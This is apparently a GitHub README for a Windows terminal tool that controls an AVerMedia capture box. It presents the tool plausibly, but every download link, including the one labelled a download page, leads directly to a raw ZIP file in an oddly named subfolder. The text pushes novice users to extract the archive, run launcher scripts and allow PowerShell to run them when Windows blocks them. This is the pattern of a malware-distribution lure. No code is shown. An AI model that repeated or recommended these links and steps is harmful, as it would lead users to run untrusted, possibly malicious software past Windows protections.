# 🕹️ gamebuddy-tui - Control your capture box fast

[![Download gamebuddy-tui](https://img.shields.io/badge/Download-GameBuddy_TUI-blue?style=for-the-badge&logo=github)](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)

## 📥 Download

Use this link to visit the page and download the app:

[Download gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)

## 🧰 What this app does

GameBuddy TUI is a small terminal app for controlling an AVerMedia Game Capture HD II or GameMate box over your network.

It helps you:

- find the box on your network
- check status and box info
- start and stop recording
- view basic device details from one screen

It runs in a terminal window, so it stays light and simple.

## ✅ What you need

Before you start, make sure you have:

- a Windows PC
- the capture box powered on
- the box and PC on the same local network
- internet access for the first download
- a terminal app on Windows, such as Command Prompt or PowerShell

For best results:

- use a wired network if you can
- keep the capture box on the same router as your PC
- close other apps that may use the same network port

## 💻 Download on Windows

1. Open the download page:
   [https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)

2. On the page, get the latest release or package for Windows.

3. Save the file to a folder you can find again, such as Downloads or Desktop.

4. If the download comes as a ZIP file, extract it first.

5. Keep the launcher file and the main app file in the same folder.

If you see these files, you are in the right place:

- `gcii_tui.py`
- `launch_gcii.cmd`
- `launch_gcii.ps1`
- `launch_gcii.sh`

For Windows, the easiest choice is usually:

- `launch_gcii.cmd` for Command Prompt
- `launch_gcii.ps1` for PowerShell

## ▶️ Run the app on Windows

### Option 1: Use Command Prompt

1. Open the folder where you saved the files.
2. Double-click `launch_gcii.cmd`.

If Windows asks what to open it with, choose Command Prompt.

### Option 2: Use PowerShell

1. Open the folder where you saved the files.
2. Double-click `launch_gcii.ps1`.

If Windows blocks the script, right-click the file and choose Run with PowerShell.

### Option 3: Start it from a terminal

1. Open Command Prompt or PowerShell.
2. Go to the folder with the files.
3. Run the launcher file for your shell.

Examples:

- `launch_gcii.cmd`
- `.\launch_gcii.ps1`

## 🔍 First time setup

When the app starts, it looks for the capture box on your network.

Do this before you open the app:

- turn on the AVerMedia box
- connect it to the same network as your PC
- wait a few seconds for it to finish starting

If the app does not find the box right away:

- check the network cable or Wi-Fi link
- make sure the box is powered on
- restart the app
- try again after a short wait

## 🖥️ What you will see

The app uses a terminal screen with simple text.

You may see:

- device discovery results
- box status
- box info
- recording controls
- messages about the current connection

The layout is made for quick use. It keeps the focus on the box, not on extra menus.

## 🎛️ Main features

### 🛰️ SSDP discovery

The app can search your local network for a supported capture box.

This helps when you do not know the box IP address.

### 📊 Status checks

You can check whether the box is ready, busy, or recording.

### ℹ️ Box info

You can view basic device info from the box itself.

### ⏺️ Record control

You can start or stop recording from the terminal.

## 🪟 Windows notes

This project is built to work well on Windows with simple launch files.

Use these tips for fewer problems:

- keep the files in one folder
- do not rename the launcher files
- avoid spaces in deeply nested folder paths
- run the app from a normal user account first
- if PowerShell asks for permission, allow the script for this session

If one launcher does not work, try the other one.

## 🧪 If the box is not found

Try these checks in order:

1. Confirm the box is on.
2. Confirm the PC and box use the same network.
3. Unplug and reconnect the network cable.
4. Restart the box.
5. Restart the app.
6. Try a different launcher file.
7. Make sure no VPN is active.

If the app still cannot find the box, open your router page and check whether the device appears there.

## 📁 Files in this folder

- `gcii_tui.py`  
  Main Python app

- `launch_gcii.cmd`  
  Launcher for `cmd.exe`

- `launch_gcii.ps1`  
  Launcher for PowerShell

- `launch_gcii.sh`  
  Launcher for Linux and macOS shells

## 🧷 Suggested folder setup

A simple setup helps keep things easy to find:

- `Downloads\gamebuddy-tui`
- `Desktop\gamebuddy-tui`

Put the files in one folder and leave them together.

## 🛠️ Common use flow

1. Turn on the capture box.
2. Open the app.
3. Let it search the network.
4. Check the box status.
5. View box info if needed.
6. Start or stop recording.

## ❓ Common questions

### Can I use this without programming knowledge?

Yes. You only need to download the files and run the right launcher.

### Does this need a special installer?

No. Use the files from the repository and start the app with the Windows launcher.

### Can I use this over the internet?

No. It is meant for your local network.

### Why does it use a terminal window?

It keeps the app simple and light. It also makes setup fast.

## 🔗 Project source

Primary download page:

[https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)

## 🧭 Quick start

1. Visit the download page.
2. Download the project files.
3. Extract them if needed.
4. Open the folder on Windows.
5. Run `launch_gcii.cmd` or `launch_gcii.ps1`.
6. Wait for the app to find your capture box.